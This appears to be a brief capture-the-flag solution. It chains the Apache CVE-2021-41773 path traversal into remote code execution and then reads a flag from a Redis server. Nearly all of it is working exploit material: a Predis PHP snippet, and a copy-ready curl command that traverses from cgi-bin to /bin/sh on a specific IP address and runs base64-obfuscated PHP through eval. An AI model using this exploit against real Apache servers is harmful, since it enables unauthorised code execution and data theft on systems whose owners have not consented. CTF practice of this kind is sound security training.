## Vulnerability
**Apache CVE-2021-41773 -> RCE -> Include vendor redis -> Get Flag**

## PHP Payload
```
require '/var/www/html/vendor/autoload.php'; $redis = new Predis\Client('tcp://redis:6379'); echo $redis->get("flag_gwej_anime");
```

## Final Payload
```
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; php -r \"eval(base64_decode('cmVxdWlyZSAnL3Zhci93d3cvaHRtbC92ZW5kb3IvYXV0b2xvYWQucGhwJzsgJHJlZGlzID0gbmV3IFByZWRpc1xDbGllbnQoJ3RjcDovL3JlZGlzOjYzNzknKTsgZWNobyAkcmVkaXMtPmdldCgiZmxhZ19nd2VqX2FuaW1lIik7Cg=='));\"" "http://103.144.22.12:5002/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
```
